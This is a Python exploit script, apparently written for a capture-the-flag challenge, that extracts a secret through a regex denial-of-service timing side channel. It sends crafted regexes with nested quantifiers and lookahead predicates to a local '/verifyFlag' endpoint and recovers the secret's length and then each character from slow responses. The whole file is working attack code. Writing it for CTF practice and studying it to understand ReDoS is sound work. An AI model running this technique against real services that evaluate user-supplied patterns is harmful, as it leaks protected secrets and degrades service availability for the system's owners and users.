import socket
import sys
import time
import random
import string
import requests
import re

# constants
THRESHOLD = 2

# predicates


def length_is(n):
    return ".{" + str(n) + "}$"


def nth_char_is(n, c):
    return ".{" + str(n-1) + "}" + re.escape(c) + ".*$"

# utilities


def redos_if(regexp, salt):
    return "^(?={})((((.*)*)*)*)*{}".format(regexp, salt)


def get_request_duration(payload):
    #sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        #sock.connect(("localhost", 9999))
        # sock.recv(1024)
        #sock.sendall((payload + "\n").encode())
        _start = time.time()
        requests.post("http://127.0.0.1:32772/verifyFlag", {"q": payload})
        # sock.recv(1024)
        _end = time.time()
        duration = _end - _start
    except:
        duration = -1
        exit(1)
    # finally:
        # sock.close()
    return duration


def prop_holds(prop, salt):
    return get_request_duration(redos_if(prop, salt)) > THRESHOLD


def generate_salt():
    return ''.join([random.choice(string.ascii_letters) for i in range(10)])


# exploit
if __name__ == '__main__':
    # generating salt
    salt = "!"  # generate_salt()
    # while not prop_holds('.*', salt):
    #    salt = generate_salt()
    #print("[+] salt: {}".format(salt))

    # leak length
    upper_bound = 15
    secret_length = 0
    for i in range(0, upper_bound):
        if prop_holds(length_is(i), salt):
            secret_length = i
    print("[+] length: {}".format(secret_length))

    S = "qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890"
    secret = ""
    for i in range(0, secret_length):
        for c in S:
            if prop_holds(nth_char_is(i+1, c), salt):
                secret += c
                print("[*] {}".format(secret))
    print("[+] secret: {}".format(secret))
